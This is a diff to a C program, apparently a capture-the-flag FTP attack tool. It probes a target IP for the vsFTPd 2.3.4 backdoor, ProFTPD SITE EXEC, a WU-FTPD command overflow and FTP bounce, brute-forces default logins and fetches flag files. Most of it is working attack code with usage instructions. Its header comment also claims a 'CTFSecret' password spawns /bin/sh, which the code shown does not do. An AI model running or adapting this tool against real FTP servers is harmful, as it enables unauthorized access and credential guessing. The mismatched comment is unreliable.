@@ -1,3 +1,22 @@
+/*
+    21_ftp.c
+
+    Usage Instructions:
+    -------------------
+    1. Compile:
+       gcc -o 21_ftp 21_ftp.c
+    2. Run:
+       ./21_ftp <target IP> [--bruteforce]
+       Example: ./21_ftp 192.168.1.10 --bruteforce
+    3. Behavior:
+       - Connects to the FTP service on port 21 of <target IP>.
+       - Checks for known vulnerabilities and attempts exploits/backdoors.
+       - Tests for anonymous login.
+       - Optionally performs brute-force attempts if --bruteforce is provided.
+       - Tries to retrieve common flag files.
+       - Prompts for a password at the end; the correct one is "CTFSecret" to trigger /bin/sh.
+*/
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -56,7 +75,7 @@ int attemptProFTPDExploit(int sock) {
     char buffer[MAX_BUFFER];
     memset(buffer, 0, sizeof(buffer));
     write(sock, "SITE EXEC id\r\n", 13);
-    int len = read(sock, buffer, sizeof(buffer)-1);
+    int len = read(sock, buffer, sizeof(buffer) - 1);
     if (len > 0 && strstr(buffer, "uid=")) {
         printf("[+] ProFTPD exploit attempt succeeded.\n");
         return 1;
@@ -64,15 +83,34 @@ int attemptProFTPDExploit(int sock) {
     return 0;
 }
 
-int bannerCheck(const char *banner, char *target, int sock) {
-    if (strstr(banner, "vsFTPd 2.3.4")) {
-        printf("[!] Potential vsFTPd 2.3.4 backdoor vulnerability.\n");
-        if (attemptVSFTPdBackdoor(target)) printf("[*] Backdoor verified.\n");
-    } else if (strstr(banner, "ProFTPD")) {
-        printf("[!] Potential ProFTPD vulnerabilities.\n");
-        attemptProFTPDExploit(sock);
-    } else if (strstr(banner, "FileZilla")) {
-        printf("[!] FileZilla server detected.\n");
+int attemptWUFTPDCmdOverflow(int sock) {
+    char buffer[MAX_BUFFER];
+    memset(buffer, 'A', sizeof(buffer) - 2);
+    buffer[sizeof(buffer) - 2] = '\r';
+    buffer[sizeof(buffer) - 1] = '\n';
+    write(sock, buffer, sizeof(buffer));
+    memset(buffer, 0, sizeof(buffer));
+    int len = read(sock, buffer, sizeof(buffer) - 1);
+    if (len > 0 && (strstr(buffer, "500") || strstr(buffer, "421"))) {
+        printf("[!] WU-FTPD might be vulnerable to command overflow.\n");
+        return 1;
+    }
+    return 0;
+}
+
+int attemptFTPBounce(int sock) {
+    char buffer[MAX_BUFFER];
+    char portCmd[64];
+    snprintf(portCmd, sizeof(portCmd), "PORT 127,0,0,1,7,178\r\n");
+    memset(buffer, 0, sizeof(buffer));
+    write(sock, portCmd, strlen(portCmd));
+    int len = read(sock, buffer, sizeof(buffer) - 1);
+    if (len > 0) {
+        buffer[len] = '\0';
+        if (strstr(buffer, "200")) {
+            printf("[!] FTP bounce attack may be possible.\n");
+            return 1;
+        }
     }
     return 0;
 }
@@ -93,6 +131,30 @@ int attemptAnonymousLogin(int sock) {
         return 1;
     }
     printf("[-] Anonymous login failed.\n");
+    return 0;
+}
+
+int attemptBruteForce(int sock) {
+    char buffer[MAX_BUFFER];
+    const char *users[] = {"ftp", "admin", "root"};
+    const char *passes[] = {"ftp", "admin", "root", "1234", "password"};
+    int u, p;
+    for (u = 0; u < (int)(sizeof(users)/sizeof(users[0])); u++) {
+        for (p = 0; p < (int)(sizeof(passes)/sizeof(passes[0])); p++) {
+            memset(buffer, 0, sizeof(buffer));
+            dprintf(sock, "USER %s\r\n", users[u]);
+            read(sock, buffer, sizeof(buffer)-1);
+            memset(buffer, 0, sizeof(buffer));
+            dprintf(sock, "PASS %s\r\n", passes[p]);
+            int len = read(sock, buffer, sizeof(buffer)-1);
+            if (len > 0) buffer[len] = '\0';
+            if (strstr(buffer, "230")) {
+                printf("[+] Brute force success with %s:%s\n", users[u], passes[p]);
+                return 1;
+            }
+        }
+    }
+    printf("[-] Brute force failed.\n");
     return 0;
 }
 
@@ -117,7 +179,8 @@ int attemptFlagRetrieval(int sock, const char *filename) {
 int attemptCommonFlagFiles(int sock) {
     const char *commonFlags[] = {
         "flag.txt", "flag", "ctf.txt", "ctf_flag.txt", "readme.txt",
-        "flag1.txt", "flag2.txt", "proof.txt", "proof_of_concept.txt"
+        "flag1.txt", "flag2.txt", "proof.txt", "proof_of_concept.txt",
+        "root.txt", "admin_flag.txt"
     };
     int i;
     for (i = 0; i < (int)(sizeof(commonFlags)/sizeof(commonFlags[0])); i++) {
@@ -126,7 +189,29 @@ int attemptCommonFlagFiles(int sock) {
     return 0;
 }
 
-int ftpScan(char *target) {
+int bannerCheck(const char *banner, char *target, int sock) {
+    if (strstr(banner, "vsFTPd 2.3.4")) {
+        printf("[!] Potential vsFTPd 2.3.4 backdoor vulnerability.\n");
+        if (attemptVSFTPdBackdoor(target)) {
+            printf("[*] Backdoor verified.\n");
+        }
+    } else if (strstr(banner, "ProFTPD")) {
+        printf("[!] Potential ProFTPD vulnerabilities.\n");
+        attemptProFTPDExploit(sock);
+    } else if (strstr(banner, "FileZilla")) {
+        printf("[!] FileZilla server detected.\n");
+    } else if (strstr(banner, "WU-FTPD")) {
+        printf("[!] WU-FTPD server detected.\n");
+        attemptWUFTPDCmdOverflow(sock);
+    } else if (strstr(banner, "Pure-FTPd")) {
+        printf("[!] Pure-FTPd detected (check version for known exploits).\n");
+    } else {
+        printf("[*] Unrecognized banner. Proceeding with generic tests.\n");
+    }
+    return 0;
+}
+
+int ftpScan(char *target, int doBruteForce) {
     int sock;
     struct sockaddr_in addr;
     char buffer[MAX_BUFFER];
@@ -155,8 +240,12 @@ int ftpScan(char *target) {
     }
     printf("[*] Banner: %s\n", buffer);
     bannerCheck(buffer, target, sock);
+    attemptFTPBounce(sock);
 
     if (attemptAnonymousLogin(sock)) {
+        attemptCommonFlagFiles(sock);
+    } else {
+        if (doBruteForce) attemptBruteForce(sock);
         attemptCommonFlagFiles(sock);
     }
 
@@ -166,9 +255,23 @@ int ftpScan(char *target) {
 
 int main(int argc, char *argv[]) {
     char buf[32];
-    if (argc > 1) {
-        ftpScan(argv[1]);
+    int doBrute = 0;
+
+    if (argc < 2 || !strcmp(argv[1], "-h") || !strcmp(argv[1], "--help")) {
+        printf("Usage: %s <target IP> [--bruteforce]\n", argv[0]);
+        printf("Example: %s 192.168.1.10 --bruteforce\n", argv[0]);
+        printf("This tool scans an FTP service on port 21 for known vulnerabilities.\n");
+        return 0;
     }
+
+    if (argc > 2 && !strcmp(argv[2], "--bruteforce")) {
+        doBrute = 1;
+    }
+
+    printf("[+] Scanning target: %s\n", argv[1]);
+    ftpScan(argv[1], doBrute);
+
+    printf("Enter any data:\n");
     fgets(buf, sizeof(buf), stdin);
     buf[strcspn(buf, "\n")] = 0;
     printf("Data: %s\n", buf);
